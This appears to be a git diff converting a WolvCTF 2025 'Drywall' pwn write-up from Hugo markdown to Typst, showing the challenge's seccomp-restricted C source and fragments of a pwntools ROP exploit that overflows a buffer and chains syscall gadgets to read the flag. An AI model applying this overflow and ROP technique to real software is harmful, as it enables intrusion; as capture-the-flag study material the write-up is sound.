@@ -1,12 +1,17 @@
-+++
-title = 'Wolvctf2025 Drywall'
-date = 2025-03-31T13:23:52-03:00
-tags = ['pwn']
-+++
+#import "./html_elements.typ": post
 
-writeup coming soon...
+#show: post
+// +++
+// title = 'Wolvctf2025 Drywall'
+// date = 2025-03-31T13:23:52-03:00
+// tags = ['pwn']
+// +++
 
-# challenge source
+// writeup coming soon...
+= Drywall
+
+
+= challenge source
 
 ```c
 #include <seccomp.h>
@@ -28,10 +33,10 @@ int main(){
     setvbuf(stderr, NULL, _IONBF, 0);
     setvbuf(stdin, NULL, _IONBF, 0);
 
-    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW); 
+    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);
 
-    
-    
+
+
     seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),0);
     seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open),0);
     seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat),0);
@@ -42,7 +47,7 @@ int main(){
 
 
     seccomp_load(ctx);
-    
+
     char buf[256];
     puts("What is your name, epic H4x0r?");
     fgets(name, 30, stdin);
@@ -56,7 +61,7 @@ int main(){
 ```
 
 
-# solution
+= solution
 
 ```python
 from pwn import *
@@ -124,7 +129,7 @@ p += p64(pop_rsi_pop_r15)
 p += p64(flag)
 p += p64(0xdeadbeef)
 p += p64(pop_rdx)
-p += p64(100)                 
+p += p64(100)
 p += p64(syscall)
 
 io.sendline(cyclic(280) + p)
